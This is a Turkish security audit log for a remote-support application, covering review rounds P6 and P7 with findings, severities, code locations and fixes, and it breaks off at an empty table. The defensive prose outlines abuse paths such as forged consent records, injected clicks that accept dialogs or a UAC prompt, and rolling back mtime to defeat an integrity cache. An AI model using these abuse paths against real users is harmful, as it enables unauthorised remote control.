### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S6-1 ve S6-2 Orta derecede ama P6 kapanmadan düzeltilmesi önerilir (küçük değişiklikler). S6-3..S6-8 "Sonra" listesine eklenebilir. Kritik/Yüksek 0, P6 güvenlik kapısı açık.

DURUM: GEÇTİ

## P6 doğrulama turu 2 — S6-1..S6-9 kapanışı + yeni yüzeyler (2026-11-11)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (yeni) + 1 bilgi notu

Kapsam: S6-1..S6-9 düzeltmeleri commit edilmemiş değişiklik olarak incelendi. Bu tur yalnız statik inceleme yapıldı; `go test`, govulncheck ve `pnpm test` çalıştırılmadı. Tur sınırı nedeniyle bazı yüzeyler doğrulanamadı; bunlar aşağıda "doğrulanmadı" olarak işaretlendi.

### S6 maddelerinin durumu
| Madde | Durum | Kanıt |
|---|---|---|
| S6-1 (Orta) `ptr()` use-after-free | **KAPANDI** | `ptr()` kaldırıldı. `Str()` artık `*uint16` döndürüyor (`internal/win/win_windows.go:250`). Dönüşümler çağrı argümanının içinde yapılıyor: `:281-282` CreateWindowExW, `:334-335` SendMessageStr, `:340-341` SetText, `:357-358` MessageBox, `:461-462` DrawText, `:482-484` CreateFont, `:539-540` ShellExecute. `capture/com_windows.go:27` (`call`) ve `:52` (`procHR`) `//go:uintptrescapes` ile işaretli. `internal/win/unsafeptr_test.go` AST testi tüm modülü tarıyor: `uintptr(unsafe.Pointer(…))` yalnız `Call/call/procHR/SyscallN` argümanında olabilir ve iki sarmalayıcıda işaret zorunlu. Test derleme etiketi taşımıyor, bu yüzden Linux CI'da da çalışır. Kalan tek dönüşüm `form_windows.go:200` (WM_DPICHANGED lParam → `*RECT`); bu bellek işletim sistemine ait olduğu için sorun değil. |
| S6-2 (Orta) `/downloads/*` kapıyı atlıyor | **KAPANDI** | `deploy/Caddyfile:101-104`: `@agentExe` → `route { forward_auth server:3001 { uri /internal/agent-ready } … file_server }`. Kapı dosya sunulmadan önce çalışıyor; 2xx dışı yanıt (503 veya server erişilemezse 502) istemciye dönüyor, dolayısıyla fail-closed. `X-Forwarded-Uri` maskeli. `:86`: `/internal/*` dışarıya 404. Server tarafı `public/routes.ts:32-41`: soket adresi `TRUSTED_PROXY_CIDR` içinde olmalı (tanımsızsa loopback) ve `X-Forwarded-Method` gelmeli, aksi halde 404. `assertAgentReady` (`public/agent.ts:55`) 302 yolu ile aynı kapı. Uç `app.ts:163` ile `/internal` önekinde kayıtlı. Global `log default` filtresi (`Caddyfile:20-35`) hata loguna sorgu dizesi, `/session/***`, `/downloads/Destek-***` ve kimlik başlıkları maskesini uyguluyor; bu S6-9 bilinen 3'ü de kapatıyor. `agent-watch.yml`'deki ölü `server503` dalı **doğrulanmadı**. |
| S6-3 (Düşük) MOTW/rename | **KAPANDI** | `internal/transfer/transfer.go:190-197`: MOTW `.part` dosyasına rename'den önce yazılıyor. MOTW yazılamazsa ve `NameWarning != none` ise `.part` siliniyor ve sonuç `REJECTED` oluyor. `rename_windows.go:22`: `MoveFileEx(s, d, 0)` değiştirme bayrağı olmadan çağrılıyor; `ERROR_ALREADY_EXISTS`/`ERROR_FILE_EXISTS` → `errExists`. `transfer.go:216-232` `place()` bu durumda en fazla 5 kez yeni ad deniyor. Windows dışı eşdeğer (`rename_other.go`) `os.Link` ile çalışıyor, o da üzerine yazmıyor. |
| S6-4 (Düşük) PR derlemesinde gerçek URL | **KAPANDI** | `.github/workflows/agent-win.yml:142-144`: gerçek adres yalnız `EVENT = push` olduğunda gömülüyor; PR ve `workflow_dispatch` placeholder alıyor. Etiket derlemesi yalnız etiket push'unda yapılıyor (`:132-134`). |
| S6-5 (Düşük) başarısız koşu ve `--dir` yayını | **KAPANDI (kısmen kabul edilen risk)** | `deploy/agent/verify-and-publish.sh:125-129`: `conclusion != success` → `die`. Bu ancak açık `--allow-failed-run` ile aşılabiliyor ve etiket `-failedrun` oluyor (`PUBLISHED.log`). `:113`: bu bayrak yalnız `--run` ile geçerli. `--dir` + `--no-attestation` önerildiği gibi tamamen yasaklanmadı. Ancak `ALLOW_UNATTESTED=staging` olmadan `die` ediyor (`:109-111`), uyarı veriyor ve etiket `-unattested` oluyor. Repo private olduğu için attestation üretilemiyor (S6-9 bilinen 2); bu nedenle staging'de bu kalan risk kabul edilebilir. Prod'da (P10) repo public olunca `--no-attestation` kullanılmamalı. `--allow-failed-run` için staging kısıtı betikte zorlanmıyor, yalnız metinde yazıyor (bilgi notu B-1). |
| S6-6 (Düşük) proxy env | **KAPANDI (bilinçli karar)** | `docs/adr/0010-imzasiz-dagitim.md:13` (r3, Proxy satırı): gerekçe, sınır, kabul edilen risk ve reddedilen alternatif yazılı. `docs/mimari.md:199` T13 metni "HTTP(S)_PROXY yalnız taşıma yolu; URL/TLS değiştirilemez" olarak güncellendi. Kod: `internal/api/api.go:68` (`ProxyFromEnvironment`), TLS ≥1.2, `CheckRedirect` → `ErrUseLastResponse`. |
| S6-7 (Düşük) ICE kuyruğu / abuseEmail | **KAPANDI** | `internal/rtc/rtc.go:72` `MaxPendingICE = 64`, `:274-275` sınır dolunca fazlası düşürülüyor. `internal/api/logo.go:121-130` `ValidAbuseEmail`: ≤190 karakter ve katı regex; `?`, `&`, boşluk ve denetim karakterleri biçim gereği dışarıda kalıyor. Doğrulama `internal/flow/flow.go:166` içinde ShellExecute'tan önce yapılıyor; geçersizse bağlantı gizleniyor. |
| S6-8 (Düşük) tehlikeli uzantı listesi | **KAPANDI** | `packages/contracts/src/files.ts` (+12 uzantı: one, onepkg, wsc, sct, diagcab, website, ade, adp, mde, mshxml, jnlp, cab). Go eşi `internal/files/files.go:87-93` aynı listeyi içeriyor. `files_test.go:94` `TestS68DangerousExtMatchesContracts` contracts kaynak dosyasını okuyup birebir eşitliği test ediyor. Fixture güncellendi (`fixtures/file-names.json`, +48 satır). |
| S6-9 bilinen 1 (govulncheck kanıtı) | **AÇIK, doğrulanmadı** | Bu tur CI çıktısı görülmedi. Kanıt `docs/implementation.md`'ye eklenmeli (P6 kapanış koşulu değil, kayıt). |
| S6-9 bilinen 2 (attestation / private repo) | **AÇIK (bilinen, P10 öncesi)** | Değişiklik yok. Prod açılışından önce repo public yapılmalı ya da Enterprise Cloud kullanılmalı. |
| S6-9 bilinen 3 (Caddy hata logu) | **KAPANDI** | `deploy/Caddyfile:20-35` global `log default` filtresi. |

### Yeni yüzeyler
- **Go logo indirme (`internal/api/logo.go`)**: Olumlu. Yalnız kök-göreli yol ya da scheme ve host:port'u gömülü adresle birebir aynı URL kabul ediliyor (`:36-58`). `//`, userinfo, fragment, opaque, ters bölü, NUL, CR/LF ve boşluk reddediliyor. Çözümlenen sonuçta köken yeniden kontrol ediliyor. Yönlendirme izlenmiyor (`api.go` `CheckRedirect`). İstek kimlik başlığı taşımıyor. Yalnız 200 kabul ediliyor, `Content-Length` ve `LimitReader` ile ≤2 MB. `Content-Type` ve magic bayt birlikte kontrol ediliyor. Çözmeden önce `DecodeConfig` ile en/boy ≤2048 sınırı uygulanıyor (bomba koruması; en kötü durumda ~32 MB). Yalnız ilgili türün çözücüsü çağrılıyor. 3 sn zaman aşımı var ve her hatada sistem logosu gösteriliyor (`flow.go:201-210`). Ölçekleme (`ui/logo.go`) sınır kontrollü.
- **`capture/` + `ui/screens_windows.go`, `ui/form_windows.go` (hızlı bakış)**: Olumlu. DXGI `Map` dilimi `pitch*(h-1)+w*4` ile sınırlı ve `pitch < w*4` reddediliyor (`dxgi_windows.go:195-199`). `ConvertBGRA` girdiyi ayrıca doğruluyor (`nv12.go:69-71`). MF Lock dilimleri tampon uzunluğuyla sınırlı (`mf_windows.go:332, 504`). Sohbet geçmişi ve onay metni `ES_READONLY` (`screens_windows.go:170, 302`). Sohbet girişi `EM_LIMITTEXT` 2000. `mailto:` yalnız doğrulanmış adresle açılıyor (`:190`).
- **Web indirme bileşeni (`apps/web/app/session/[token]/agent-download.tsx`, `apps/web/lib/agent-download.ts`)**: **doğrulanmadı** (tur sınırı).
- **`apps/agent-win/test/trace-check.ps1` ve `.github/workflows/agent-watch.yml`**: **doğrulanmadı** (tur sınırı). Salt okunurluk ve `server503` dalının kaldırılması bir sonraki turda kontrol edilmeli.

### Yeni bulgular
#### N6-1 [DÜŞÜK] Bütünlük önbelleği anahtarı `ctime` içermiyor; yerinde yeniden yazma ve `mtime` geri alma ile hash yeniden hesaplanmıyor — A08 (G-07)
Yer: `apps/server/src/public/agent-binary.ts:45` (`const key = \`${st.size}:${st.mtimeMs}:${st.ino}\``)
Sorun: Volume'a yazabilen biri dosyayı aynı inode üzerinde aynı boyutla yeniden yazıp `touch -d` ile `mtime`'ı geri alırsa önbellek anahtarı değişmez. Kapı bu durumda server yeniden başlayana kadar "ok" dönmeye devam eder.
İstismar senaryosu: Volume'a yazma yetkisi gerekir (S6-2'deki tehdit aktörü). Günlük dış gözcü (agent-watch) uyuşmazlığı yine yakalar, dolayısıyla etki fail-closed vaadinin zayıflamasıyla sınırlı.
Düzeltme (backend-dev): Anahtara `st.ctimeMs` eklenmeli. `ctime` kullanıcı tarafından geri alınamaz.

#### B-1 [BİLGİ] `--allow-failed-run` staging kısıtı yalnız metinde
Yer: `deploy/agent/verify-and-publish.sh:125-129`. Bayrak `ALLOW_UNATTESTED=staging` ya da hedef ortamla ilişkilendirilmemiş. Prod (P10) öncesi bayrağın da `ALLOW_UNATTESTED=staging` (veya ayrı bir staging göstergesi) şartına bağlanması önerilir (devops).

Not: `TRUSTED_PROXY_CIDR=172.30.0.2/31` web konteynerini (172.30.0.3) de kapsıyor. Bu yüzden `/internal/agent-ready` web'den çağrılabilir. Uç yalnız hazır/hazır değil bilgisi döndürdüğü için etkisi yok; bilgi amaçlı.

### Ajan bazında
- backend-dev: N6-1 (tek satır).
- devops: B-1; S6-9 bilinen 1 kanıtı; `agent-watch.yml` ölü dalının durumu (sonraki turda doğrulanacak).
- Sonraki tur: web indirme bileşeni, `trace-check.ps1`, `agent-watch.yml`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
N6-1 ve B-1 "Sonra" listesine eklenebilir. S6-9 bilinen 2 (attestation) P10 prod açılışı için ön koşul olarak kalıyor.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0; S6-1 ve S6-2 Orta bulguları kapandı)

---

## P7 — Tur 1 — Uzaktan kontrol (2026-11-11)
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 3 / Düşük 7

Kapsam: commit edilmemiş P7 değişiklikleri: `packages/contracts/src/{ws,dc,audit}.ts`, `apps/server/src/signaling/{control,rooms,handlers,ws,types}.ts`, `apps/agent-win/internal/{control,input,env,signal,rtc,flow,ui}` + `cmd/noktadestek/main.go`, `apps/web/lib/control/*` (machine.ts ayrıntılı, input/use-remote-input yüzeysel). Ölçüt: `docs/mimari-protokol.md` §3.3 ve §4.3. §3.3 artık mimar kararını içeriyor (ADR-0013 olarak anılıyor, ancak `docs/adr/` altında dosya yok). Bu tur yalnız statik inceleme yapıldı; Windows'ta davranış doğrulanmadı.

### Bulgular (öncelik sırasıyla)

#### S7-1 [YÜKSEK] "Kontrolü bırak" yalnız konsolda yerel duraklatma; müşteri kapısı ve sunucu durumu GRANTED kalıyor — A01 Erişim Kontrolü / A04 Güvensiz Tasarım
Yer: `apps/web/lib/control/machine.ts:106-109` (`release`/`resume` yalnız `paused`). Kodda `control.release` yok: `packages/contracts/src/ws.ts:104-107, 183-187`, `apps/server/src/signaling/control.ts` ve `apps/agent-win/internal/flow/control.go:58-88` bu mesajı tanımıyor. Bağlayıcı karar: `docs/mimari-protokol.md` §3.3 K1.
Sorun: Teknisyen kontrolü bıraktığını sanıyor, ama müşteri istemcisinde kapı açık kalıyor. Sunucu kaydı GRANTED olarak sürüyor. "Kontrole devam" yeni izin istemeden girdi göndermeyi yeniden başlatıyor. Müşteri teknisyenin işi bıraktığını sanıp göstergeyi önemsemeyebilir.
İstismar senaryosu: Teknisyen "bıraktım" diyor, müşteri işine dönüyor. Daha sonra konsol (aynı sekme; XSS, kötü niyetli tarayıcı eklentisi ya da bilerek yapılan "devam") müşteriye yeni diyalog göstermeden fare ve klavye enjekte edebiliyor. Audit zaman çizelgesinde kontrol oturum sonuna kadar açık görünüyor ve bırakma anı kaydedilmiyor (AC-111 zaman çizelgesi eksik kalıyor). En az yetki ilkesi ihlal ediliyor.
Düzeltme: K1 uygulanmalı. contracts'a `control.release` ve `source: "TECH"` eklenmeli. Sunucu GRANTED iken önce VIEW'a geçmeli, misafire `control.release`, teknisyene `{VIEW,TECH}` göndermeli, ardından REVOKED/TECH ve `control.released` audit kaydını yazmalı. `session_consents.source` CHECK kısıtına `TECH` eklenmeli (dba). Go istemci `control.release`/`control.cancel` gelince durumdan bağımsız olarak kapıyı kapatmalı ve diyaloğu kapatmalı. Konsolda "Kontrolü bırak" `control.release` göndermeli; "Kontrole devam" yeni `control.request` olmalı. (atanan: backend-dev — sunucu + contracts + Go; frontend-dev — konsol; dba — CHECK migration)

#### S7-2 [ORTA] Sunucu GRANTED'i bekleyen istek olmadan kabul ediyor, konsol istenmemiş GRANTED ile yakalamayı başlatıyor; istek iptali (`control.cancel`) yok — A04 / A08 Bütünlük
Yer: `apps/server/src/signaling/control.ts:151-153`: `onGranted` yalnız `c.state === "GRANTED"` olup olmadığına bakıyor, `REQUESTED` şartı aramıyor; `control.revoke{stale}` yok. `apps/web/lib/control/machine.ts:151`: `control.state{GRANTED}` her fazda (idle/ended/denied) `phase: "granted"` yapıyor. "Vazgeç" yok (Frontend P7 sapma 2). Karar: §3.3 K2.
Sorun ve istismar:
(a) Kabul edilmiş ama kötü niyetli bir misafir (AGENT gibi davranan özel istemci), istek olmadan `control.state{GRANTED,UI}` ve ardından `{VIEW,UI}` mesajlarını 50 msg/sn token bucket sınırına kadar gönderebilir. Her çift `session_consents` + audit tablosuna TX yazıyor: veri tabanı yükü büyüyor ve sahte "müşteri izin verdi" kayıtları oluşuyor (zaman çizelgesi bütünlüğü bozuluyor). Teknisyen konsolu da istemediği hâlde yakalamaya geçiyor; görüntü alanında basılan tuşlar misafire gidiyor.
(b) İptal mesajı yok: teknisyenin vazgeçtiği bir istek müşteri ekranında açık kalıyor. Müşteri bunu sonradan onaylarsa kapı açılıyor.
Düzeltme: K2 uygulanmalı. GRANTED yalnız `REQUESTED` durumunda işlenmeli. VIEW durumundaki geç GRANTED'e `control.revoke{stale}` gönderilmeli, kayıt yazılmamalı, log `control_state_unexpected` düşülmeli. `control.cancel` eklenmeli. Konsol beklemediği GRANTED'de yakalamayı başlatmamalı ve `control.release` göndermeli. Sunucu kontrolüne ek olarak misafir başına `control.state` için ayrı ve düşük bir kota konmalı (örneğin dakikada 20). (backend-dev, frontend-dev)

#### S7-3 [ORTA] Kısayol kanca iş parçacığında `gate.Close()` → `ReleaseAll` Applier kilidini bekliyor; aynı anda `SendInput` aynı iş parçacığının LL kancasını bekliyor → kanca zaman aşımına kadar kilitlenme, Windows kancayı sessizce kaldırabilir — A04
Yer: `apps/agent-win/internal/input/host_windows.go:132-136` (WM_HOTKEY → `g.Close()` kanca iş parçacığında). `internal/control/gate.go:31-42` (`Close` dinleyicileri senkron çalıştırıyor). `internal/input/applier.go:92-104` (`Handle`, `a.mu` kilidini tutarken `Inject` çağırıyor).
Sorun: Enjekte edilen girdi LL kancalarından geçer. Kanca prosedürü, kancayı kuran iş parçacığının mesaj döngüsünde çalışır. Teknisyen sürekli fare hareketi gönderirken müşteri Ctrl+Shift+F12'ye basarsa iki taraf birbirini bekler: kanca iş parçacığı `ReleaseAll` → `a.mu`'yu, Pion goroutine'i ise `a.mu` tutarken `SendInput` → kanca iş parçacığını bekler. Kilit `LowLevelHooksTimeout` (~300 ms–1 sn) dolunca çözülür. Kapı `Swap(false)` ile hemen kapandığı için yeni olay uygulanmaz, ancak:
(1) Windows 7+ zaman aşımına uğrayan kancayı bildirim yapmadan kaldırabilir. Bu durumda oturumun geri kalanında AC-104 yerel önceliği ve enjekte tıklama tespiti (`lastPressInjected`) çalışmaz; tespit son değerde donar ve fail-open olur.
(2) Kısayol işlenene kadar kullanıcı girdisi sistem genelinde takılır.
Davranış Windows'ta doğrulanmalı (elle test adımı 30/31 sürekli hareket altında yapılmalı).
Düzeltme: Kanca iş parçacığında yalnız atomik kapatma yapılmalı (`g.open.Store(false)`). `ReleaseAll` ve `onHotkey` ayrı bir goroutine'e taşınmalı (`go ...`). Genel kural: `Gate.Close` dinleyicileri kanca iş parçacığından senkron çağrılmamalı. Kanca prosedürlerinde kilit alınmadığı test veya yorumla güvenceye bağlanmalı. (backend-dev — Go)

#### S7-4 [ORTA → tasarım uyumu] Teknisyen kopmasında/sekme değişiminde sunucu `control.revoke{reconnect}` göndermiyor (K3 ikinci katman eksik)
Yer: `apps/server/src/signaling/rooms.ts` `attachTech` (`resetControl` + `peer.joined`) ve `detachTech` (`resetControl` + `peer.left`). `CONTROL_REVOKE_REASONS` içinde `reconnect`/`stale` yok (`packages/contracts/src/ws.ts:106`). Go tarafında `revokeReasons` (`internal/signal/messages.go`) da bu değerleri bilmediği için yeni bir değer gelirse şema hatası verir.
Sorun: Bugün kapı yalnız istemcinin `peer.left/peer.joined{tech}` → `techChanged` yoluyla kapanıyor (`internal/flow/control.go:207-214`). Tek katmanlı bir güvenlik kontrolü: istemci bu mesajı kaçırırsa ya da gelecekte bir yeniden düzenleme bu yolu bozarsa, yeni teknisyen sekmesine açık kapı devredilir. Önem Orta: bugün istismar edilebilir bir yol görülmedi, ancak bağlayıcı tasarımın savunma derinliği eksik.
Düzeltme: Sunucu, ADMITTED misafir bağlıysa önce `control.revoke{reconnect}`, sonra `peer.left/joined` göndermeli. contracts ve Go `revokeReasons` listesine `reconnect` ve `stale` eklenmeli. Go istemci bilinmeyen `reason` değerini yine kapatma olarak işlemeli: kapatma yönünde şema hatası fail-closed olmalı. (backend-dev)

#### S7-5 [DÜŞÜK] Enjekte tıklama tespiti "sistem genelindeki son basış"a bakıyor; dosya teklifi diyaloğunda hiç yok — A04 (G-03)
Yer: `apps/agent-win/internal/input/host_windows.go:73-76` (`lastPressInjected` her basışta global olarak değişiyor). `internal/ui/control_windows.go:92`. `internal/ui/screens_windows.go:434-480` (`FileOffer`: `LastPressInjected` kontrolü yok, ortak `consentDlg` kullanılmıyor).
Sorun: Kontrol açıkken teknisyen monitör diyaloğundaki "İzin ver" düğmesine enjekte `down` gönderir. Arada müşterinin yaptığı yerel bir tuş basışı bayrağı `false` yapar. Teknisyen 1 sn askı sonrasında `up` gönderir ve BN_CLICKED izin olarak sayılır. Dosya teklifi diyaloğunda teknisyen kendi gönderdiği dosyayı (ör. `.exe`) enjekte tıklamayla doğrudan kabul edebilir. Her iki durumda da kapı zaten açık olduğu için etki sınırlı, ancak G-03'ün "ortak consent_dialog" vaadi karşılanmıyor.
Düzeltme: BN_CLICKED anında `GetCurrentInputMessageSource` (`IMO_INJECTED`) kullanılmalı ya da tıklamayı başlatan `down` olayının bayrağı düğme bazında tutulmalı. Dosya teklifi de `consentDlg` üzerine taşınmalı (Kabul et = enjekte değilse). (backend-dev — Go)

#### S7-6 [DÜŞÜK] Oturum penceresindeki "Erişime izin ver" sabit konumda; imleç-dışı yerleşim kuralı (G-03) bu yolda yok — A04 (clickjacking)
Yer: `apps/agent-win/internal/ui/screens_windows.go:325-331, 343-346`; `control_windows.go:79-87` (`arm` bu düğmeyi de etkinleştiriyor).
Sorun: Müşteri sohbet sırasında oturum penceresindeki Gönder/Oturumu bitir alanında çalışırken teknisyen istek gönderir. 1,5 sn sonra imlecin altında ya da yakınında etkin bir "Erişime izin ver" belirir. Diyalog `PlaceAway` ile konumlanıyor ama bu ikinci yol konumlanmıyor.
Düzeltme: Düğme, imleç düğme dikdörtgenindeyse etkinleştirilmemeli. Ya da ilk 1,5 sn'den sonra yalnız fare düğmenin üstüne yeniden girdikten (`WM_MOUSEMOVE` giriş) sonraki tıklama kabul edilmeli. Daha basit seçenek: bu düğme diyaloğu öne getirsin, izin vermesin. (backend-dev — Go)

#### S7-7 [DÜŞÜK] LL fare/klavye kancaları ve global kısayol programın tüm ömrü boyunca kurulu (KVKK onayı ve lobi öncesi dahil)
Yer: `apps/agent-win/cmd/noktadestek/main.go:71-72` (`input.Start` UI kurulumunun hemen ardından). Agent P7 sapma 7.
Sorun: Kanca yalnız bayrak okuyor, tuş değeri saklamıyor; gizlilik etkisi yok. Ancak (1) imzasız tek dosya + `WH_KEYBOARD_LL`, AV/EDR keylogger buluşsallarını tetikleme olasılığını artırıyor. (2) Her sistem girdisi bir Go geri çağrısından geçiyor; GC duraklamasında sistem genelinde girdi gecikiyor. (3) Ctrl+Shift+F12 bütün süre boyunca başka uygulamalardan alınmış oluyor.
Düzeltme: Kısayol başlangıçta kayıtlı kalabilir (G-21 için gerekçe geçerli). LL kancaları yalnız `phActive` iken ve en azından ilk kontrol isteği ile oturum sonu arasında kurulmalı. Bu kararın gerekçesi implementation.md'ye yazılmalı. (backend-dev — Go)

#### S7-8 [DÜŞÜK] `input` kanalında hız sınırı yok; işleme Pion goroutine'inde senkron yapılıyor
Yer: `apps/agent-win/internal/rtc/rtc.go` `LabelInput` dalı (`OnMessage` → `p.h.Input`); `internal/input/applier.go:87-105`.
Sorun: Kapı kapalıyken her mesaj JSON olarak ayrıştırılıp düşürülüyor. Kapı açıkken sınırsız `SendInput` yapılıyor. Kötü niyetli konsol, müşteri CPU'sunu ve girdi kuyruğunu doldurabilir. 512 bayt sınırı mevcut.
Düzeltme: Token bucket eklenmeli (ör. 250 msg/sn, ani patlama 500). Aşımda düşürülmeli ve sayılmalı. Kapı kapalıyken ayrıştırma yapmadan erken düşürülmeli (`gate.IsOpen()` ön kontrolü, kilit altındaki asıl kontrol korunarak). (backend-dev — Go)

#### S7-9 [DÜŞÜK] İstemci yönetici olarak çalıştırılırsa yükseltilmiş pencereler ve masaüstündeki UAC denetlenebilir; uyarı yok
Yer: `apps/agent-win/internal/env/probe_windows.go:29-31` (kendi süreç yükseltilmişse `elevatedForeground=false`).
Sorun: Müşteri "Yönetici olarak çalıştır" ile açarsa UIPI sınırı kalkar. Teknisyen yönetici yetkisiyle işlem yapar; `PromptOnSecureDesktop=0` olan makinelerde UAC onayını da enjekte tıklamayla verebilir. Gereksinim §"kapsam dışı 2" ile çelişen ve görünmeyen bir yetki artışı.
Düzeltme: Yükseltilmiş çalışma algılanırsa kontrol diyaloğunda açık uyarı gösterilmeli. Tercih edilen yol: kontrol izni verilmemeli ya da `env.state`'e `selfElevated` eklenip audit'e yazılmalı. Karar mimarda. (backend-dev — Go, mimar)

#### S7-10 [DÜŞÜK] Misafirden gelen `control.state` `RECONNECT`/`SYSTEM` kaynağını kabul ediyor
Yer: `packages/contracts/src/ws.ts:104, 118`. §3.3'e göre `RECONNECT`/`TECH` değerlerini yalnız sunucu üretir; misafirden gelirse 1008 olmalı.
Etki: Misafir `REVOKED/RECONNECT` kaydı yazdırabilir; sahte "kopma" kaydıyla zaman çizelgesi yanıltılabilir.
Düzeltme: Misafir şemasına refine eklenmeli: VIEW yalnız `UI|HOTKEY|DENIED|SYSTEM`. (backend-dev)

#### S7-11 [DÜŞÜK / izleme] AC-115 "5 sn" bugün yalnız 60 sn'lik yedek yolla karşılanıyor
Yer: `apps/server/src/signaling/ws.ts:203-215` (`revalidateTech`). `endByTechnician`/`applyPermChange` için kod tabanında bu yol dışında çağıran yok (kullanıcı/yetki servisleri P9/P10'da gelecek).
Durum: S-P3-8 sunucu tarafında doğru kapandı. Yetki tazeleniyor, rol değişimi veya pasif kullanıcı tüm odaları bitiriyor, caps daralırsa `caps.update` + `control.revoke{permission}` gönderiliyor. Ancak P9/P10 servisleri commit sonrası `app.rooms.*` çağırmazsa yetki kaldırıldıktan sonra kontrol en çok 60 sn açık kalır. P9 ve P10 için giriş şartı olarak izlenmeli. (backend-dev)

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found** (2026-11-11, bu tur).
- Gizli bilgi taraması (`git grep` kalıbı, P7 yolları): eşleşme yok.
- govulncheck (`golang:1.26.11-bookworm`, linux + GOOS=windows): **bu tur çalıştırılmadı** (tur sınırı). implementation.md "Agent P7" v1.1.4 sonucunu iki hedefte "0 vulnerabilities" olarak bildiriyor. Yeni bağımlılık yok (`golang.org/x/sys`, stdlib); kanıt bir sonraki turda veya CI çıktısıyla teyit edilmeli.

### Tasarımda vaat edilip kodda bulunmayanlar (§3.3, ADR-0013)
- K1 `control.release` (S7-1), K2 `control.cancel` + `revoke{stale}` + GRANTED yalnız REQUESTED (S7-2), K3 `revoke{reconnect}` (S7-4).
- K4 `monitor.denied`: istemci reddi bildirmiyor, sunucu 30 sn yanıtsızlığa dayanıyor; ret audit'i yok.
- K5-d: oturum sonunda açık kontrol için REVOKED/SYSTEM satırı yazılmıyor (her GRANTED kaydının bir kapanışı olmalı).
- Teknisyen kopmasında bekleyen monitör isteğinin temizlenmesi (`resetControl`, `monitorPending`'e dokunmuyor).
- G-03 "ortak `ui/consent_dialog.go`": dosya teklifi ortak diyaloğu kullanmıyor (S7-5).
- `docs/adr/0013-*.md` dosyası yok (mimar).

### Olumlu
- **Kapı varsayılan kapalı ve yarışsız:** `control.Gate` atomik bool kullanıyor. Kapı her yolda kapanıyor: UI düğmesi UI iş parçacığında, kısayol kanca iş parçacığında, akışı beklemeden kapatıyor; `control.revoke`, `caps.update` (remote_control yok), `peer.left/joined{tech}`, WS kopması, PeerConnection disconnected/failed/closed, her `hello`, `session.ended`, `cleanup` de kapatıyor. `Applier.Handle` kapıyı enjeksiyondan hemen önce, `ReleaseAll` ile aynı kilit altında denetliyor; `Close` döndükten sonra basma olayı uygulanamıyor (AC-101 sağlanıyor; S7-3 gecikme istisnası hariç).
- `EvControlGrant` son savunma katmanı (`flow/control.go:95`): bekleyen istek, etkin oturum, `remote_control` yeteneği ve kayıtlı kısayol şart. Kısayol yoksa izin verilemiyor (G-21).
- İzin diyaloğu: Reddet varsayılan ve odakta. Enter/Space mesaj döngüsünde yutuluyor (`form_windows.go:107-111`). 1,5 sn kilit hem zamanlayıcıyla hem `CanGrant` ile uygulanıyor. Diyalog `PlaceAway` ile imleç dışına yerleşiyor ve birim testli. Diyalog açıkken ikinci istek açılmıyor. İstemci tarafında 30 sn / 5 istek yedek sayacı var.
- Input şeması iki tarafta da katı: ≤512 bayt, geçerli UTF-8, null ve bilinmeyen alan reddi, koordinat 0..1, tekerlek ±1200, `code` `^[A-Za-z0-9]{1,32}$` ve beyaz listedeki VK, `key` ≤4 UTF-16 birimi ve tek yazdırılabilir karakter. Ctrl+Alt+Del ve Win+L engelli. Yalnız kendi bastığı tuşları bırakıyor. `input` DC yalnız `remote_control` yeteneği varken iletiliyor; daralmada `SetCaps` ile kesiliyor.
- Sunucu: `remote_control.use` + caps kontrolü, BROWSER reddi, 30 sn / 5 istek kuralı sunucuda. GRANTED kaydı consent + audit tek TX; 800 ms veya hata durumunda `control.revoke{audit}` + `error{INTERNAL, ref}`; geç commit edilen kayıt REVOKED ile dengeleniyor (G-15 fail-closed). İşlemler oda başına sıralı. `epoch` ile eskimiş GRANTED dengeleniyor. Hata metninde ayrıntı yok.
- S-P3-8: 60 sn yeniden doğrulamada yetkiler tazeleniyor; rol değişimi veya pasif kullanıcı/tenant tüm odaları `auth_revoked` ile bitiriyor; `attachTech` güncel yetkiyle caps'i daraltıyor; caps oturum içinde genişlemiyor.
- Konsol: girdi yalnız GRANTED + görüntü varken gönderiliyor. VIEW, revoke, caps, INTERNAL, peer.left, kopma ya da oturum sonu gelince dinleyiciler sökülüyor ve `k.release_all` gönderiliyor. Ctrl+Alt+Del gönderilmiyor.

### Ajan bazında
- backend-dev (sunucu + contracts): S7-1, S7-2, S7-4, S7-10, S7-11 (izleme).
- backend-dev (Go): S7-1 (istemci tarafı), S7-3, S7-5, S7-6, S7-7, S7-8, S7-9.
- frontend-dev: S7-1 (bırak = `control.release`), S7-2 (Vazgeç + beklenmeyen GRANTED).
- dba: S7-1 (`session_consents.source` CHECK'e `TECH`).
- mimar: ADR-0013 dosyası; S7-9 kararı.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S7-6, S7-7, S7-8 ve S7-9 "Sonra" listesine alınabilir. S7-3 ve S7-5 Windows elle testinde doğrulanana kadar P7 kapanış listesinde kalmalı.

DURUM: DÜZELTİLMELİ (Yüksek 1: S7-1)

## P7 — Tur 2 — S7-1..S7-11 kapanış doğrulaması + yeni yüzeyler (2026-11-11)
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 0 / Düşük 5 (+ S7-9 açık, S7-11 izleme)

Kapsam: Tur 1 sonrası değişiklikler: `apps/server/src/signaling/{control,rooms,handlers}.ts`, `packages/contracts/src/ws.ts`, `apps/agent-win/internal/{control/gate.go, input/{applier.go,host_windows.go}, win/win_windows.go, ui/{form,control}_windows.go, flow/control.go}`. Ölçüt: `docs/mimari-protokol.md` §3.3 K1–K5, ADR-0013 (dosya artık var). Windows'ta çalıştırma yapılmadı; Win32 sabitleri mingw-w64 `winuser.h` ile karşılaştırıldı.

### Tur 1 maddelerinin durumu
| ID | Durum | Kanıt / not |
|---|---|---|
